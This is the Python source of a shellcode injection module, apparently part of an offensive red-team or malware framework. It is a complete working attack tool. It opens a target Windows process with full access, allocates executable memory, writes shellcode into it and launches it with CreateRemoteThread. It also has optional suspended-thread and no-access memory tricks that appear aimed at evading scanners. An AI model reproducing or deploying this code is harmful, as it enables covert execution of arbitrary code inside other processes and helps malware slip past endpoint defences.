########################################################
### Injection Module
### Status: 086
### 
########################################################

import os
from utils.windef import *
from utils.winconst import *
from utils.style import *
from utils.helper import CheckFile, GetFileInfo

CATEGORY    = 'inject'
DESCRIPTION = 'Inject shellcode into memory with CreateRemoteThread'

arglist = {
    'input':           { 'value': None, 'desc': 'Input file or buffer for process injection' },
    'process':         { 'value': None, 'desc': 'Processname to inject the shellcode' },
    'start_process':   { 'value': False, 'desc': 'If not active, start the process before injection' },
    'shellcode':       { 'value': None, 'desc': 'Internal use only, don\'t change!' },
    'resume_thread':   { 'value': False, 'desc': 'Start thread suspended and resume after speciefied time' },
    'virtual_protect': { 'value': False, 'desc': 'Deny access on memory for a specified time' }
}

def register_arguments(parser):
            parser.add_argument('-i', '--input', help=arglist['input']['desc'])
            parser.add_argument('-p', '--process', help=arglist['process']['desc'])

            grp = parser.add_argument_group('additional')
            grp.add_argument('-r', '--resume-thread', action='store_true', help=arglist['resume_thread']['desc'])
            grp.add_argument('-s', '--start-process', action='store_true', help=arglist['start_process']['desc'])
            grp.add_argument('-v', '--virtual-protect', action='store_true', help=arglist['virtual_protect']['desc'])

class module:
    from urllib import request
    from time import sleep
    import wmi
    import threading

    Author = 'cpu0x00, psycore8'
    Version = '2.2.0'
    DisplayName = 'INJECTION'
    delay = 5
    data_size = 0
    hash = ''
    pid = int
    relay = False
    shell_path = '::inject::injection'

    def __init__(self, input, process, start_process, shellcode=None, resume_thread=None, virtual_protect=None):
        self.input = input
        self.process_start = start_process
        self.target_process = process
        self.shellcode = shellcode
        self.resume_thread = resume_thread
        self.virtual_protect = virtual_protect

    def msg(self, message_type, MsgVar=any, ErrorExit=False):
        messages = {
            'pre.head'       : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'error.input'    : f'{s_fail} File {self.input} not found or cannot be opened.',    
            'post.done'      : f'{s_ok} DONE!',
            'proc.input_ok'  : f'{s_ok} File {self.input} loaded\n{s_ok} Size of shellcode {self.data_size} bytes\n{s_ok} Hash: {self.hash}',
            'mok'            : f'{s_ok} {MsgVar}',
            'mnote'          : f'{s_note} {MsgVar}',
            'merror'         : f'{s_fail} {MsgVar}'

        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def Start_Process(self):
        self.msg('mnote', f'starting {self.target_process}')
        os.system(self.target_process)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        self.pid = processes[0].ProcessId
        self.msg('mnote', f'{self.target_process} process id: {self.pid}')
        return int(self.pid)

    def start_injection(self):
        if self.process_start:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            self.sleep(3)

        process_id = self.get_proc_id()
        
        phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if phandle:
            self.msg('mnote', 'Process handle opened')

        memory = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if memory:
            self.msg('mnote', 'Process memory allocated')

        writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), 0)
        if writing:
            self.msg('mnote', 'Shellcode was written to memory')
        if self.virtual_protect:
            self.msg('mnote', 'VirtualProtectEx: PAGE_NO_ACCESS')
            VirtualProtectEx(phandle, None, 0, 0x01, None)

        if self.resume_thread or self.virtual_protect:
            self.msg('mnote', 'CreateRemoteThread: START_SUSPENDED')
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
        else:
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)

        if Injection:
            self.msg('mok', 'Shellcode injected!')

        if self.virtual_protect:
            self.msg('mnote', 'VirtualProtectEx: PAGE_READWRITE_EXECUTE')
            VirtualProtectEx(phandle, None, 0, 0x40, None)

        if self.resume_thread or self.virtual_protect:
            self.sleep(self.delay)
            self.msg('mnote', 'ResumeThread')
            self.msg('inj.rest')
            resume = ResumeThread(Injection)
            if resume:
                self.msg('mok', 'Process resumed')

        CloseHandle(phandle)

    def proc_inject():
        return False
    
    def open_file(self):
        try:
            with open(self.input, 'rb') as file:
                self.shellcode = file.read()
        except FileNotFoundError:
            return False
    
    def process(self):
        self.msg('pre.head')
        if isinstance(self.input, str):
            self.msg('mnote', f'Try to open file {self.input}')
            CheckFile(self.input)
            self.data_size, self.hash = GetFileInfo(self.input)
            self.msg('proc.input_ok')
            self.open_file()
            self.msg('mnote', 'Try to execute shellcode')
            self.start_injection()
        elif isinstance(self.input, bytes):
            self.shellcode = self.input
            self.start_injection()
        else:
            self.msg('error.input', ErrorExit=True)
        self.msg('post.done')